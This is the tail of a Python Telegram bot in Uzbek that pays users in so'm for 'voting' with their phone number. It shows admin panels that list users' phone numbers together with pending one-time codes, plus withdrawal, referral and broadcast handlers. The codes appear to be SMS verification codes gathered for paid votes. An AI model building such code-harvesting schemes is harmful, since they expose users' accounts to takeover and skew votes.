                "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
                (telegram_id,)
            )
            withdraw = cursor.fetchone()
            
            if not withdraw:
                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
                cursor.close()
                return
            
            cursor.execute(
                "UPDATE withdraws SET status = 'rejected' WHERE id = %s",
                (withdraw[0],)
            )
            
            cursor.execute(
                "UPDATE users SET balance = balance + %s WHERE telegram_id = %s",
                (withdraw[3], telegram_id)
            )
            conn.commit()
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ So'rov rad etildi!\n"
                    f"💰 {withdraw[3]:,} so'm balansga qaytarildi.",
                    reply_markup=get_user_menu()
                )
            except:
                pass
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n"
                f"👤 ID: {telegram_id}\n"
                f"💰 Summa: {withdraw[3]:,} so'm",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            
            cursor.close()
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
            await callback.answer("❌ Xatolik!", show_alert=True)
        finally:
            if conn:
                return_db_connection(conn)

# ================= 11. ADMIN STATISTIKA =================
@dp.message(F.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
        registered_users = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
        unregistered_users = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        pending = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        verified = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM codes WHERE status = 'rejected'")
        rejected = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM verified_phones")
        verified_phones = cursor.fetchone()[0]
        
        cursor.execute("SELECT COALESCE(SUM(balance), 0) FROM users")
        total_balance = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
        pending_withdraws = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM withdraws WHERE status = 'completed'")
        completed_withdraws = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM referrals")
        total_referrals = cursor.fetchone()[0]
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 Jami foydalanuvchilar: {total_users}\n"
            f"✅ Ro'yxatdan o'tganlar: {registered_users}\n"
            f"⏳ Telefon kiritmaganlar: {unregistered_users}\n\n"
            f"📱 Tasdiqlangan raqamlar: {verified_phones}\n"
            f"🔑 Kodlar:\n"
            f"  • Kutayotgan: {pending}\n"
            f"  • Tasdiqlangan: {verified}\n"
            f"  • Rad etilgan: {rejected}\n\n"
            f"💰 Jami balans: {total_balance:,} so'm\n"
            f"💸 Yechish:\n"
            f"  • Kutayotgan: {pending_withdraws}\n"
            f"  • Yakunlangan: {completed_withdraws}\n\n"
            f"👥 Jami referallar: {total_referrals}",
            parse_mode="HTML"
        )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 12. KUTAYOTGAN KODLAR =================
@dp.message(F.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT * FROM codes WHERE status = 'pending' AND expires_at > NOW() ORDER BY id DESC LIMIT 20"
        )
        codes = cursor.fetchall()
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"👤 ID: <code>{c[3]}</code>\n"
                text += f"📞 Tel: <code>{c[1]}</code>\n"
                text += f"🔑 Kod: <code>{c[2]}</code>\n"
                text += f"⏳ Yaratilgan: {c[5].strftime('%H:%M:%S')}\n"
                text += f"⏰ Tugaydi: {c[6].strftime('%H:%M:%S')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 13. YECHISH SO'ROVLARI =================
@dp.message(F.text == "💸 Yechish so'rovlari")
async def pending_withdraws(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        withdraws = cursor.fetchall()
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"👤 ID: <code>{w[1]}</code>\n"
                text += f"📱 Ma'lumot: <code>{w[2]}</code>\n"
                text += f"💰 Summa: <code>{w[3]:,} so'm</code>\n"
                text += f"📅 Vaqt: {w[5].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 14. TASDIQLANGAN RAQAMLAR =================
@dp.message(F.text == "✅ Tasdiqlangan raqamlar")
async def verified_phones_list(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM verified_phones ORDER BY id DESC LIMIT 50")
        phones = cursor.fetchall()
        
        if phones:
            text = "✅ <b>TASDIQLANGAN RAQAMLAR:</b>\n\n"
            for p in phones:
                text += f"📞 {p[1]}\n"
                text += f"👤 ID: {p[2]}\n"
                text += f"📅 Vaqt: {p[3].strftime('%Y-%m-%d %H:%M')}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Tasdiqlangan raqamlar yo'q")
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 15. BARCHAGA XABAR =================
@dp.message(F.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer("📨 Xabar matnini yozing:")

@dp.message(lambda message: message.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT telegram_id FROM users")
        users = cursor.fetchall()
        
        sent = 0
        failed = 0
        for user in users:
            try:
                await bot.send_message(user[0], f"📨 <b>XABAR</b>\n\n{text}", parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                failed += 1
                logger.error(f"❌ Xabar yuborishda xatolik ({user[0]}): {e}")
        
        await message.answer(
            f"✅ Yuborildi: {sent} ta\n"
            f"❌ Xatolik: {failed} ta",
            reply_markup=get_admin_menu()
        )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 16. BALANS KOMANDASI =================
@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT balance, phone FROM users WHERE telegram_id = %s", (message.from_user.id,))
        user = cursor.fetchone()
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
            return
        
        if user[1] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=get_user_menu()
            )
            return
        
        await message.answer(f"💰 Balans: {user[0]:,} so'm", reply_markup=get_user_menu())
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= 17. ADMIN MENU =================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Admin panel", reply_markup=get_admin_menu())

# ================= 18. REFERALLAR =================
@dp.message(F.text == "👥 Referallar")
async def show_referrals(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    if not check_rate_limit(telegram_id):
        await message.answer("⏳ Iltimos, biroz kuting...")
        return
    
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("SELECT referral_code FROM users WHERE telegram_id = %s", (telegram_id,))
        user = cursor.fetchone()
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        ref_count = get_referral_count(telegram_id)
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        await message.answer(
            f"👥 <b>REFERRAL TIZIMI</b>\n\n"
            f"🔗 <b>Sizning referal link:</b>\n"
            f"<code>{ref_link}</code>\n\n"
            f"👤 <b>Referallar soni:</b> {ref_count}\n"
            f"🎯 <b>Yechish uchun kerak:</b> {MIN_REFERRALS} ta\n\n"
            f"📤 Linkni do'stlaringizga yuboring!\n"
            f"{MIN_REFERRALS} ta do'stingiz start bossa, pul yechib olasiz",
            parse_mode="HTML"
        )
        
        cursor.close()
    except Exception as e:
        logger.error(f"❌ Referallar xatosi: {e}")
    finally:
        if conn:
            return_db_connection(conn)

# ================= XATOLIKLARNI QAYTA ISHLASH =================
@dp.errors()
async def errors_handler(update, exception):
    logger.error(f"❌ Xato: {exception}")
    return True

# ================= HTTP SERVER =================
async def health_check(request):
    return web.Response(text="Bot is running!")

async def start_http_server():
    try:
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', PORT)
        await site.start()
        logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
        
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        logger.error(f"❌ HTTP server xatosi: {e}")

# ================= KEEP-ALIVE =================
async def keep_alive():
    while True:
        try:
            await bot.get_me()
            logger.info("📡 Ping yuborildi")
        except Exception as e:
            logger.error(f"❌ Ping xatosi: {e}")
        await asyncio.sleep(60)

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    try:
        init_db_pool()
        init_db()
    except Exception as e:
        logger.error(f"❌ Database init xatosi: {e}")
        return
    
    asyncio.create_task(start_http_server())
    asyncio.create_task(keep_alive())
    
    logger.info("✅ Bot tayyor!")
    
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()
        if db_pool:
            db_pool.closeall()

if __name__ == "__main__":
    asyncio.run(main())
